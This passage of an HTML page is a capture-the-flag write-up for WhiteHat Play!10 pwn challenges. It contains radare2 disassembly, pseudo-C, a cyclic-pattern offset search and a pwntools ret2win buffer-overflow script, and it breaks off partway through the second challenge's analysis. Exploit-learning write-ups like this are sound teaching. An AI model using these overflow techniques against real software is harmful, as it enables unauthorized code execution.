@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>PWN Journey: Part 2 :: Yet, another infosec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.
+" />
+<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/pwns-2/" />
+
+
+
+
+<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">
+
+  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="The Archivist" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PWN Journey: Part 2">
+<meta property="og:description" content="In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.
+" />
+<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/pwns-2/" />
+<meta property="og:site_name" content="Yet, another infosec blog" />
+
+  
+    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="PWN Journey" />
+
+
+  <meta property="article:published_time" content="2022-01-10 09:30:00 &#43;1345 &#43;1345" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blog/en/">
+  <div class="logo">
+    <style>
+      .blink {
+        animation: blinker 1s linear infinite;
+        color: red!important;
+}
+.logo_anchor
+{
+  color: blue!important;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+    </style>
+    <div class="logo_anchor">
+      ./&ThinSpace; 
+    </div>
+      Archivist
+    <div class="blink"> # </div> 
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/en/posts">1.Posts</a></li>
+        
+      
+        
+          <li><a href="/blog/en/categories">2.Categories</a></li>
+        
+      
+        
+          <li><a href="/blog/en/tags">3.Tags</a></li>
+        
+      
+        
+          <li><a href="/blog/en/about">4.About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">More ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+              
+            
+              
+                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/en/posts">1.Posts</a></li>
+      
+    
+      
+        <li><a href="/blog/en/categories">2.Categories</a></li>
+      
+    
+      
+        <li><a href="/blog/en/tags">3.Tags</a></li>
+      
+    
+      
+        <li><a href="/blog/en/about">4.About</a></li>
+      
+    
+      
+        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+      
+    
+      
+        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://legiahuyy.github.io/blog/en/posts/pwns-2/">PWN Journey: Part 2</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-01-10
+        
+      </span>
+    
+    
+      <span class="post-author">:: The Archivist</span>
+    
+    
+      <span class="post-reading-time">:: 21 min read (4416 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/write-up/">write-up</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/radare2/">radare2</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#whitehat-play10---pwn01">WhiteHat Play!10 - pwn01</a>
+      <ul>
+        <li><a href="#fingerprinting">Fingerprinting</a></li>
+        <li><a href="#code-breakdown">Code breakdown</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#solvepy">SOLVE.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#whitehat-play10---pwn02">WhiteHat Play!10 - pwn02</a>
+      <ul>
+        <li><a href="#fingerprinting-1">Fingerprinting</a></li>
+        <li><a href="#in-depth-analysis">In-depth analysis</a></li>
+        <li><a href="#code-breakdown-1">Code breakdown</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#solvepy-1">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#login-custom">login (custom)</a>
+      <ul>
+        <li><a href="#fingerprinting-2">Fingerprinting</a></li>
+        <li><a href="#code-breakdown-2">Code breakdown</a></li>
+        <li><a href="#in-depth-analysis-1">In-depth analysis</a></li>
+        <li><a href="#solvepy-2">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#footnotes">Footnotes</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.</p>
+<p>Anyway, I hope you have a good time reading.</p>
+<h2 id="whitehat-play10---pwn01">WhiteHat Play!10 - pwn01<a href="#whitehat-play10---pwn01" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Trigger the buffer overflow and call <code>covid19</code>.</p>
+<p>This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it <a href="https://drive.google.com/file/d/1sHGwTRkcGEqCxas8SqCoVt-P6FV-468B/view">here</a> or use this <a href="https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/easybof">mirror link</a>.</p>
+<h3 id="fingerprinting">Fingerprinting<a href="#fingerprinting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Initially, we want to know what type of the binary we are going to analyze and we will have <code>file</code> and <code>radare2</code> to determine its properties.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_10-10.png" alt=""></p>
+<p>A 64-bit ELF with NX bit enabled.</p>
+<p>The challenge, of course, does not provide us with its original source code. Here is a list of functions and their disassembled-views.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_12-33.png" alt=""></p>
+<p>At <code>0x004011d9</code> - <code>main</code>:</p>
+<pre tabindex="0"><code>[0x7f1963069050]&gt; s main;pdf
+            ; DATA XREF from entry0 @ 0x4010f1
+┌ 221: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_120h @ rbp-0x120
+│           ; var int64_t var_114h @ rbp-0x114
+│           ; var int64_t var_110h @ rbp-0x110
+│           ; var int64_t var_4h @ rbp-0x4
+│           ; arg int argc @ rdi
+│           ; arg char **argv @ rsi
+│           0x004011d9      f30f1efa       endbr64
+│           0x004011dd      55             push rbp
+│           0x004011de      4889e5         mov rbp, rsp
+│           0x004011e1      4881ec200100.  sub rsp, 0x120
+│           0x004011e8      89bdecfeffff   mov dword [var_114h], edi   ; argc
+│           0x004011ee      4889b5e0feff.  mov qword [var_120h], rsi   ; argv
+│           0x004011f5      488b05342e00.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
+│                                                                      ; [0x404030:8]=0                                                
+│           0x004011fc      b900000000     mov ecx, 0
+│           0x00401201      ba02000000     mov edx, 2
+│           0x00401206      be00000000     mov esi, 0
+│           0x0040120b      4889c7         mov rdi, rax
+│           0x0040120e      e89dfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401213      488b05062e00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
+│                                                                      ; [0x404020:8]=0                                                
+│           0x0040121a      b900000000     mov ecx, 0
+│           0x0040121f      ba02000000     mov edx, 2
+│           0x00401224      be00000000     mov esi, 0
+│           0x00401229      4889c7         mov rdi, rax
+│           0x0040122c      e87ffeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401231      488b05082e00.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
+│                                                                      ; [0x404040:8]=0                                                
+│           0x00401238      b900000000     mov ecx, 0
+│           0x0040123d      ba02000000     mov edx, 2
+│           0x00401242      be00000000     mov esi, 0
+│           0x00401247      4889c7         mov rdi, rax
+│           0x0040124a      e861feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x0040124f      488d3dda0d00.  lea rdi, str.You_can_find_the_key_to_save_humanity_from_the_COVID_19_pandemic ; 0x402030 ; &quot;You can find the key to save humanity from the COVID-19 pandemic&quot;                                                                      
+│           0x00401256      e825feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040125b      488d3d0f0e00.  lea rdi, str.Here_is_your_chance:_ ; 0x402071 ; &quot;Here is your chance: &quot;
+│           0x00401262      e819feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00401267      488d85f0feff.  lea rax, [var_110h]
+│           0x0040126e      4889c6         mov rsi, rax
+│           0x00401271      488d3d0f0e00.  lea rdi, [0x00402087]       ; &quot;%s&quot;
+│           0x00401278      b800000000     mov eax, 0
+│           0x0040127d      e83efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x00401282      488d85f0feff.  lea rax, [var_110h]
+│           0x00401289      4889c7         mov rdi, rax
+│           0x0040128c      e8fffdffff     call sym.imp.strlen         ; size_t strlen(const char *s)
+│           0x00401291      8945fc         mov dword [var_4h], eax
+│           0x00401294      488d85f0feff.  lea rax, [var_110h]
+│           0x0040129b      4889c7         mov rdi, rax
+│           0x0040129e      e8ddfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012a3      488d3de00d00.  lea rdi, str.No_please_try_again____ ; 0x40208a ; &quot;No,please try again!!!!&quot;
+│           0x004012aa      e8d1fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012af      b800000000     mov eax, 0
+│           0x004012b4      c9             leave
+└           0x004012b5      c3             ret
+</code></pre><p>and at <code>0x004011b6</code>, we have <code>covid19</code>:</p>
+<pre tabindex="0"><code>[0x004011d9]&gt; s sym.covid19 ;pdf
+┌ 35: sym.covid19 ();
+│           0x004011b6      f30f1efa       endbr64
+│           0x004011ba      55             push rbp
+│           0x004011bb      4889e5         mov rbp, rsp
+│           0x004011be      488d3d430e00.  lea rdi, str.Congratulations_ ; 0x402008 ; &quot;Congratulations!&quot;
+│           0x004011c5      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004011ca      488d3d480e00.  lea rdi, str.cat__home_easybof_flag ; 0x402019 ; &quot;cat /home/easybof/flag&quot;
+│           0x004011d1      e8cafeffff     call sym.imp.system         ; int system(const char *string)
+│           0x004011d6      90             nop
+│           0x004011d7      5d             pop rbp
+└           0x004011d8      c3             ret
+</code></pre><p>If you have a difficult time understand this low-level language, try to get the gist and look at their roughly equivalent pseudo-c as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+	<span style="color:#66d9ef">int</span> size;
+	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x110</span>];
+	puts(<span style="color:#e6db74">&#34;You can find the key to save humanity from the COVID-19 pandemic&#34;</span>);
+	puts(<span style="color:#e6db74">&#34;Here is your chance: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, buffer);
+	size <span style="color:#f92672">=</span> strlen(buffer);
+	puts(buffer)
+	puts(<span style="color:#e6db74">&#34;No,please try again!!!!&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">covid19</span>()
+{
+	puts(<span style="color:#e6db74">&#34;Congratulations!&#34;</span>);
+	system(<span style="color:#e6db74">&#34;cat /home/easybof/flag&#34;</span>);
+}
+</code></pre></div><h3 id="code-breakdown">Code breakdown<a href="#code-breakdown" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>There are two functions, <code>main</code> and <code>covid19</code>.</p>
+<p><code>main</code> creates a presumable buffer of <code>0x110</code> bytes in size and <code>covid19</code> merely prints <code>Congratulations!</code> then calls <code>system</code> to read the flag at <code>/home/easybof/flag</code>.</p>
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As <code>scanf</code> has no boundary check, it provides a buffer overflow opportunity for us to exploit. We thus have to determine the padding length between the buffer and our RIP, thereby making it point to the address of <code>covid19</code>.</p>
+<p>Hence, our <em>ret2win</em> skeleton payload:</p>
+<pre tabindex="0"><code>payload = PAD_TIL_RIP (??) + covid19_ADDR (??)
+</code></pre><p>In order to find the <code>PAD_TIL_RIP</code> variable, as you may or may not have already known from my previous post, we mentioned a sequence called De Bruijn Sequence that can evaluate the distance between the start offset of our buffer and RIP.</p>
+<p>And make sure your sequence has the length of <code>buffer_size + 4n</code>, keep increase until a SIGSEGV (code=1) occurs. In this case, I will have <a href="https://r2wiki.readthedocs.io/en/latest/tools/ragg2/">ragg2</a> to generate a sequence of 284 characters</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/Study/PWN/WhiteHatWargame/pwn1_c15747119b<span style="color:#f92672">]</span>
+└─$ ragg2 -P <span style="color:#ae81ff">280</span> -r
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABg
+</code></pre></div><p>then feed it to the program and successfully be able to control the RIP.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_16-53.png" alt=""></p>
+<p>So, our <code>PAD_TIL_RIP</code> would be 280.</p>
+<p>The last variable is <code>covid19_ADDR</code>, which we can get with <code>afl~covid19</code>.</p>
+<pre tabindex="0"><code>[0x7f0041684241]&gt; afl~covid19
+0x004011b6    1 35           sym.covid19
+[0x7f0041684241]&gt; 
+</code></pre><p>And our final payload is:</p>
+<pre tabindex="0"><code>payload = PAD_TIL_RIP (280) + covid19_ADDR (0x004011b6)
+</code></pre><h3 id="solvepy">SOLVE.py<a href="#solvepy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now, we already have everything needed for the script but unfortunately, I could not connect to the wargame server as it ended a month ago, so I created a fake flag locate exactly at <code>/home/easybof/flag</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./easybof&#39;</span>)
+r <span style="color:#f92672">=</span> process()
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">280</span>		<span style="color:#75715e"># padding</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x004011b6</span>)	<span style="color:#75715e"># covid19 address</span>
+
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Here is your chance: &#39;</span>, payload)
+print(r<span style="color:#f92672">.</span>recvall())
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_17-08.png" alt=""></p>
+<hr>
+<h2 id="whitehat-play10---pwn02">WhiteHat Play!10 - pwn02<a href="#whitehat-play10---pwn02" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Modify a volatile variable and successfully read the flag.</p>
+<p>This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it <a href="https://drive.google.com/file/d/1w3QMg-5BHwIr1p7OMkJLyJIVd9Ug0k9_/view?usp=sharing">here</a> or use this <a href="https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/ChickenStar">mirror link</a>.</p>
+<p>From my perspective, the challenge itself is neither difficult nor complicated and we have already had a similar one in our first part of the journey. Nevertheless, I still want to give you another example of how I go around and poke things to solve these tasks. Moreover, there is one new detail (to me, at least) in this challenge, which I thought it might intrigue you readers.</p>
+<h3 id="fingerprinting-1">Fingerprinting<a href="#fingerprinting-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As usual, let us check the properties of our ELF - &ldquo;ChickenStar&rdquo;.</p>
+<p><code>radare2</code> output:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-22.png" alt=""></p>
+<p><code>file</code> output:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-24.png" alt=""></p>
+<p>During normal execution, the program prompts for a password then repeats our input and prints a constant value of <code>0x43563139</code>.</p>
+<!-- raw HTML omitted -->
+<h3 id="in-depth-analysis">In-depth analysis<a href="#in-depth-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Have a glance at the functions list and their disassembly in radare2.</p>
+<p>Type <code>afl</code> to list all functions.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_09-50.png" alt=""></p>
+<p>The binary composed of two principal functions, <code>main</code> and <code>sym.check</code>.</p>
+<p>You may have noticed that the addresses are somewhat different from other challenges we have encountered and this happens by reason of the PIE protection bit (stands for <strong>P</strong>osition <strong>I</strong>ndependent <strong>E</strong>xecutable), which means every time you run the file, it gets loaded into a different memory region and this prevent hardcode values such as function addresses or gadget locations, thus making it <em>slightly</em> more difficult for ret2win, ret2libc and such others to work properly.</p>
+<p>Let see what is inside <code>main</code></p>
+<pre tabindex="0"><code>            ; DATA XREF from entry0 @ 0x5555555551a1
+┌ 304: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_60h @ rbp-0x60
+│           ; var int64_t var_18h @ rbp-0x18
+│           0x5555555552ae      f30f1efa       endbr64
+│           0x5555555552b2      55             push rbp
+│           0x5555555552b3      4889e5         mov rbp, rsp
+│           0x5555555552b6      53             push rbx
+│           0x5555555552b7      4883ec58       sub rsp, 0x58
+│           0x5555555552bb      48c745e83931.  mov qword [var_18h], 0x43563139 ; '91VC'
+│           0x5555555552c3      488b05662d00.  mov rax, qword [reloc.stdin] ; [0x555555558030:8]=0
+│           0x5555555552ca      b900000000     mov ecx, 0
+│           0x5555555552cf      ba02000000     mov edx, 2
+│           0x5555555552d4      be00000000     mov esi, 0
+│           0x5555555552d9      4889c7         mov rdi, rax
+│           0x5555555552dc      e86ffeffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x5555555552e1      488b05382d00.  mov rax, qword [reloc.stdout] ; [0x555555558020:8]=0
+│           0x5555555552e8      b900000000     mov ecx, 0
+│           0x5555555552ed      ba02000000     mov edx, 2
+│           0x5555555552f2      be00000000     mov esi, 0
+│           0x5555555552f7      4889c7         mov rdi, rax
+│           0x5555555552fa      e851feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x5555555552ff      488b053a2d00.  mov rax, qword [reloc.stderr] ; [0x555555558040:8]=0
+│           0x555555555306      b900000000     mov ecx, 0
+│           0x55555555530b      ba02000000     mov edx, 2
+│           0x555555555310      be00000000     mov esi, 0
+│           0x555555555315      4889c7         mov rdi, rax
+│           0x555555555318      e833feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x55555555531d      488d3d040d00.  lea rdi, str.Can_you_find_the_bank_password_to_prove_your_idols_purity_ ; 0x555555556028 ; &quot;Can you find the bank password to prove your idols' purity!&quot;                                                                                               
+│           0x555555555324      e8c7fdffff     call sym.imp.puts       ; int puts(const char *s)
+│           0x555555555329      488d3d380d00.  lea rdi, str.Enter_string_password_here_to_print_account_statement:_ ; 0x555555556068 ; &quot;Enter string password here to print account statement: &quot;                                                                                                      
+│           0x555555555330      b800000000     mov eax, 0
+│           0x555555555335      e8d6fdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x55555555533a      488d45a0       lea rax, [var_60h]
+│           0x55555555533e      4889c6         mov rsi, rax
+│           0x555555555341      488d3d580d00.  lea rdi, [0x5555555560a0] ; &quot;%s&quot;
+│           0x555555555348      b800000000     mov eax, 0
+│           0x55555555534d      e80efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x555555555352      488d45a0       lea rax, [var_60h]
+│           0x555555555356      4889c6         mov rsi, rax
+│           0x555555555359      488d3d430d00.  lea rdi, str.__s_n      ; 0x5555555560a3 ; &quot; %s\n&quot;
+│           0x555555555360      b800000000     mov eax, 0
+│           0x555555555365      e8a6fdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x55555555536a      488b45e8       mov rax, qword [var_18h]
+│           0x55555555536e      4889c6         mov rsi, rax
+│           0x555555555371      488d3d300d00.  lea rdi, str.val:_0x_08x_n ; str.val:_0x_08x_n
+│                                                                      ; 0x5555555560a8 ; &quot;val: 0x%08x\n&quot;                                          
+│           0x555555555378      b800000000     mov eax, 0
+│           0x55555555537d      e88efdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x555555555382      b8efbeadde     mov eax, 0xdeadbeef
+│           0x555555555387      483945e8       cmp qword [var_18h], rax
+│       ┌─&lt; 0x55555555538b      752f           jne 0x5555555553bc
+│       │   0x55555555538d      488d3d210d00.  lea rdi, str.Good_Job_Amazing_ ; 0x5555555560b5 ; &quot;Good Job,Amazing!&quot;
+│       │   0x555555555394      e857fdffff     call sym.imp.puts       ; int puts(const char *s)
+│       │   0x555555555399      e882fdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
+│       │   0x55555555539e      89c3           mov ebx, eax
+│       │   0x5555555553a0      e87bfdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
+│       │   0x5555555553a5      89de           mov esi, ebx
+│       │   0x5555555553a7      89c7           mov edi, eax
+│       │   0x5555555553a9      e892fdffff     call sym.imp.setreuid
+│       │   0x5555555553ae      488d3d120d00.  lea rdi, str.cat__home_ChickenStar_flag ; 0x5555555560c7 ; &quot;cat /home/ChickenStar/flag&quot;
+│       │   0x5555555553b5      e846fdffff     call sym.imp.system     ; int system(const char *string)
+│      ┌──&lt; 0x5555555553ba      eb16           jmp 0x5555555553d2
+│      │└─&gt; 0x5555555553bc      488d3d250d00.  lea rdi, str.Incorrect_password_cannot_print_account_statement._Please_try_again____ ; 0x5555555560e8 ; &quot;Incorrect password cannot print account statement. Please try again!!!!&quot;                                                                      
+│      │    0x5555555553c3      e828fdffff     call sym.imp.puts       ; int puts(const char *s)
+│      │    0x5555555553c8      bf01000000     mov edi, 1
+│      │    0x5555555553cd      e89efdffff     call sym.imp.exit       ; void exit(int status)
+│      │    ; CODE XREF from main @ 0x5555555553ba
+│      └──&gt; 0x5555555553d2      b800000000     mov eax, 0
+│           0x5555555553d7      4883c458       add rsp, 0x58
+│           0x5555555553db      5b             pop rbx
+│           0x5555555553dc      5d             pop rbp
+└           0x5555555553dd      c3             ret
+</code></pre><p>and <code>check</code>.</p>
+<pre tabindex="0"><code>┌ 69: sym.check ();
+│           0x555555555269      f30f1efa       endbr64
+│           0x55555555526d      55             push rbp
+│           0x55555555526e      4889e5         mov rbp, rsp
+│           0x555555555271      b900000000     mov ecx, 0
+│           0x555555555276      ba00000000     mov edx, 0
+│           0x55555555527b      be00000000     mov esi, 0
+│           0x555555555280      bf00000000     mov edi, 0
+│           0x555555555285      b800000000     mov eax, 0
+│           0x55555555528a      e8a1feffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
+│           0x55555555528f      4883f8ff       cmp rax, 0xffffffffffffffff
+│       ┌─&lt; 0x555555555293      7516           jne 0x5555555552ab
+│       │   0x555555555295      488d3d6c0d00.  lea rdi, str.__LOL________ ; 0x555555556008 ; &quot;========&gt; LOL!!!!!! &lt;========&quot;
+│       │   0x55555555529c      e84ffeffff     call sym.imp.puts       ; int puts(const char *s)
+│       │   0x5555555552a1      bfffffffff     mov edi, 0xffffffff     ; -1
+│       │   0x5555555552a6      e835feffff     call sym.imp._exit      ; void _exit(int status)
+│       └─&gt; 0x5555555552ab      90             nop
+│           0x5555555552ac      5d             pop rbp
+└           0x5555555552ad      c3             ret
+</code></pre><p>Here are their equivalent pseudo-c.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+	<span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">long</span> password <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x43563139</span>;
+   	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">72</span>];
+    
+	puts(<span style="color:#e6db74">&#34;Can you find the bank password to prove your idols</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> purity!&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;Enter string password here to print account statement: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, buffer);
+	printf(<span style="color:#e6db74">&#34; %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,local_68);
+	printf(<span style="color:#e6db74">&#34;val: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, check);
+    
+    <span style="color:#66d9ef">if</span>(password <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>)
+    {
+	__euid <span style="color:#f92672">=</span> geteuid();
+	__ruid <span style="color:#f92672">=</span> geteuid();
+	setreuid(__ruid,__euid);
+	system(<span style="color:#e6db74">&#34;cat /home/ChickenStar/flag&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+    puts(<span style="color:#e6db74">&#34;Incorrect password cannot print account statement. Please try again!!!!&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check</span>()	<span style="color:#75715e">/*sym.check*/</span>
+{
+    <span style="color:#66d9ef">long</span> trace <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    trace <span style="color:#f92672">=</span> ptrace(PTRACE_TRACEME, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span>(trace <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+    {
+        puts(<span style="color:#e6db74">&#34;========&gt; LOL!!!!!! &lt;========&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// Terminate entire process
+</span><span style="color:#75715e"></span>    }
+}
+</code></pre></div><h3 id="code-breakdown-1">Code breakdown<a href="#code-breakdown-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>main</code>:</p>
+<ul>
+<li>Creates a buffer of 72 bytes and a volatile variable (dubbed <code>password</code>) with <code>0x43563139</code> as its value</li>
+<li>Reads and prints out the buffer as well as <code>password</code>, consecutively.</li>
+<li>Prints the flag whether <code>password</code> is equal to <code>0xdeadbeef</code>; otherwise, exits normally</li>
+</ul>
+<p><code>check</code>:</p>
+<ul>
+<li>Being called during startup (<code>__libc_csu_init</code>)</li>
+<li>Traces and examines memory region and registers to act as an anti-debugging method</li>
+</ul>
